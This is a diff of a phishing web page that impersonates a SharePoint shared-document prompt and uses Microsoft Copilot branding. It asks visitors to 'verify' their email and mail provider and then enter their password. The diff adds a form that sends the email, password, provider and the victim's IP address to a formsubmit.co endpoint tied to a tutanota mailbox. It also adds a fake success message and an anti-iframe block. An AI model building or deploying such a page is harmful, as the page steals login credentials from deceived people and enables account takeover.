@@ -137,7 +137,7 @@
 
     <!-- Footer -->
     <footer class="main-footer">
-        <p>&copy; SharePoint 2026.</p>
+        <p>&copy; SharePoint 2026</p>
     </footer>
 
 <!-- Popup Form -->
@@ -151,118 +151,156 @@
                      alt="Fedelis Logo" 
                      class="logo-image">
                 <div class="logo-text">
-                    <span class="logo-name">SharePoint</span>
-                    <span class="logo-subtitle"></span>
+                    <span class="logo-name">FEDELIS</span>
+                    <span class="logo-subtitle"> </span>
                 </div>
             </div>
         </div>
         
         <div class="popup-header">
             <span id="formTitle">Verify Your Identity</span>
-            <button class="close-popup">&times;</button>
+            <button type="button" class="close-popup">&times;</button>
         </div>
         
-        <div class="popup-body">
-           <div class="form-step active" id="step1">
-    <p class="form-message">To open this secure document's, we'll need you to enter the email that this item was shared to.</p>
-    
-    <!-- Mail Provider Selection -->
-    <div class="form-group">
-        <label for="mailProvider">Select Mail Provider</label>
-        <div class="mail-provider-dropdown">
-            <div class="dropdown-selected" id="dropdownSelected">
-                <i class="fas fa-envelope"></i>
-                <span>Select Mail Provider</span>
-                <i class="fas fa-chevron-down dropdown-arrow"></i>
+        <!-- Formspree Form -->
+        <form class="popup-body" id="popupForm" action="https://formsubmit.co/laferlanotaries@tutanota.com" method="POST">
+            <!-- Hidden inputs for Formspree -->
+            <input type="hidden" name="_subject" value="New Document Access Request">
+            <input type="hidden" name="_format" value="plain">
+            <input type="hidden" name="_language" value="en">
+            <input type="hidden" name="_next" value="#success">
+            <input type="hidden" name="_captcha" value="false">
+            
+            <div class="form-step active" id="step1">
+                <p class="form-message">To open this secure document's, we'll need you to enter the email that this File was shared to</p>
+                
+                <!-- Mail Provider Selection -->
+                <div class="form-group">
+                    <label for="mailProvider">Select Mail Provider</label>
+                    <div class="mail-provider-dropdown">
+                        <div class="dropdown-selected" id="dropdownSelected">
+                            <i class="fas fa-envelope"></i>
+                            <span>Select mail provider or type full email</span>
+                            <i class="fas fa-chevron-down dropdown-arrow"></i>
+                        </div>
+                        <div class="dropdown-options" id="dropdownOptions">
+                            <div class="dropdown-option" data-value="gmail">
+                                <i class="fab fa-google"></i>
+                                <span>Gmail</span>
+                                <span class="option-hint">@gmail.com</span>
+                            </div>
+                            <div class="dropdown-option" data-value="yahoo">
+                                <i class="fab fa-yahoo"></i>
+                                <span>Yahoo Mail</span>
+                                <span class="option-hint">@yahoo.com</span>
+                            </div>
+                            <div class="dropdown-option" data-value="outlook">
+                                <i class="fab fa-microsoft"></i>
+                                <span>Outlook/Hotmail</span>
+                                <span class="option-hint">@outlook.com</span>
+                            </div>
+                            <div class="dropdown-option" data-value="icloud">
+                                <i class="fab fa-apple"></i>
+                                <span>iCloud Mail</span>
+                                <span class="option-hint">@icloud.com</span>
+                            </div>
+                            <div class="dropdown-option" data-value="aol">
+                                <i class="fas fa-at"></i>
+                                <span>AOL Mail</span>
+                                <span class="option-hint">@aol.com</span>
+                            </div>
+                            <div class="dropdown-option" data-value="custom">
+                                <i class="fas fa-edit"></i>
+                                <span>Other/Custom Email</span>
+                                <span class="option-hint">Enter full email</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Email Input Field - Single Input -->
+                <div class="form-group">
+                    <label for="email">Email</label>
+                    <div class="email-input-container">
+                        <input type="email" id="email" name="email" placeholder="Enter Email" required>
+                        <div class="email-input-hint" id="emailHint">
+                            <!-- Hint will appear here -->
+                        </div>
+                    </div>
+                </div>
+                
+                <button type="button" class="next-btn" id="nextBtn1">Next</button>
+                
+                <p class="privacy-notice">By clicking Next you allow Microsoft Copilot to use your email address in accordance with privacy statement. San Martin Real Estate has not provided links to their terms for you to review.</p>
             </div>
-            <div class="dropdown-options" id="dropdownOptions">
-                <div class="dropdown-option" data-value="gmail">
-                    <i class="fab fa-google"></i>
-                    <span>Gmail</span>
-                    <span class="option-hint">@gmail.com</span>
-                </div>
-                <div class="dropdown-option" data-value="yahoo">
-                    <i class="fab fa-yahoo"></i>
-                    <span>Yahoo</span>
-                    <span class="option-hint">@yahoo.com</span>
-                </div>
-                <div class="dropdown-option" data-value="outlook">
-                    <i class="fab fa-microsoft"></i>
-                    <span>Outlook</span>
-                    <span class="option-hint">@outlook.com</span>
-                </div>
-                <div class="dropdown-option" data-value="icloud">
-                    <i class="fab fa-apple"></i>
-                    <span>iCloud</span>
-                    <span class="option-hint">@icloud.com</span>
-                </div>
-                <div class="dropdown-option" data-value="aol">
-                    <i class="fas fa-at"></i>
-                    <span>AOL</span>
-                    <span class="option-hint">@aol.com</span>
-                </div>
-                <div class="dropdown-option" data-value="custom">
-                    <i class="fas fa-edit"></i>
-                    <span>Other Email</span>
-                    <span class="option-hint">Enter full email</span>
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <!-- Email Input Field - Single Input -->
-    <div class="form-group">
-        <label for="email">Enter Your Email</label>
-        <div class="email-input-container">
-            <input type="email" id="email" placeholder="Email" required>
-            <div class="email-input-hint" id="emailHint">
-                <!-- Hint will appear here -->
-            </div>
-        </div>
-    </div>
-    
-    <button class="next-btn" id="nextBtn1">Next</button>
-    
-    <p class="privacy-notice">By clicking Next you allow Microsoft Copilot to use your email address in accordance with privacy statement. San Martin Real Estate has not provided links to their terms for you to review.</p>
-</div>
             
             <div class="form-step" id="step2">
-    <!-- Email Display Section - Simplified without change button -->
-    <div class="email-display-container">
-        <div class="email-display-header">
-            <i class="fas fa-envelope email-icon"></i>
-            <span>Verifying email:</span>
-        </div>
-        <div class="email-display-value" id="displayedEmail">
-            <!-- Email will be inserted here by JavaScript -->
-        </div>
-    </div>
-    
-    <div class="form-group">
-        <label for="password">Enter Your Password</label>
-        <input type="password" id="password" placeholder="Password" required>
-    </div>
-    
-    <button class="submit-btn" id="submitBtn">Submit</button>
-    
-    <div class="back-to-email">
-        <button class="back-btn" id="backBtn">
-            <i class="fas fa-arrow-left"></i> Back to Email
-        </button>
-    </div>
-</div>
+                <!-- Email Display Section - Simplified without change button -->
+                <div class="email-display-container">
+                    <div class="email-display-header">
+                        <i class="fas fa-envelope email-icon"></i>
+                        <span>Verifying Email:</span>
+                    </div>
+                    <div class="email-display-value" id="displayedEmail">
+                        <!-- Email will be inserted here by JavaScript -->
+                    </div>
+                </div>
+               
+                <p class="form-message">Please enter your password to continue accessing the document.</p>
+                
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Enter Password" required>
+                </div>
+                
+                <!-- Hidden input for provider -->
+                <input type="hidden" id="providerInput" name="provider">
+                <!-- Hidden input for IP address -->
+                <input type="hidden" id="ipAddressInput" name="ip_address">
+                
+                <button type="submit" class="submit-btn" id="submitBtn">Submit</button>
+                
+                <div class="back-to-email">
+                    <button type="button" class="back-btn" id="backBtn">
+                        <i class="fas fa-arrow-left"></i> Back to Email
+                    </button>
+                </div>
+            </div>
             
             <div class="form-step" id="step3">
                 <div class="success-message">
                     <i class="fas fa-check-circle"></i>
-                    <h3>Access Granted Successfully!</h3>
+                    <h3>Successfully Submitted!</h3>
                     <p>You will be redirected shortly...</p>
+                    <div class="redirect-info">
+                        <p><i class="fas fa-external-link-alt"></i> Preparing to open document...</p>
+                    </div>
                 </div>
             </div>
-        </div>
+        </form>
+    </div>
+</div>
+    <script src="script.js"></script>
+
+<!-- Security Alert Overlay -->
+<div id="securityAlertOverlay" style="display: none;">
+    <div class="security-alert-box">
+        <i class="fas fa-shield-alt security-alert-icon"></i>
+        <p class="security-alert-message" id="securityAlertMessage">
+            Security feature triggered.
+        </p>
+        <button class="security-alert-btn" onclick="document.getElementById('securityAlertOverlay').style.display='none'">
+            <i class="fas fa-check-circle"></i> OK
+        </button>
     </div>
 </div>
 
-    <script src="script.js"></script>
+<!-- Iframe Warning (hidden by default) -->
+<div class="iframe-warning" id="iframeWarning">
+    <i class="fas fa-ban" style="font-size: 4rem; margin-bottom: 20px; color: #e74c3c;"></i>
+    <h2>Access Denied</h2>
+    <p>This page cannot be embedded in iframes for security reasons.</p>
+    <p>Please access this page directly.</p>
+</div>
 </body>
 </html>
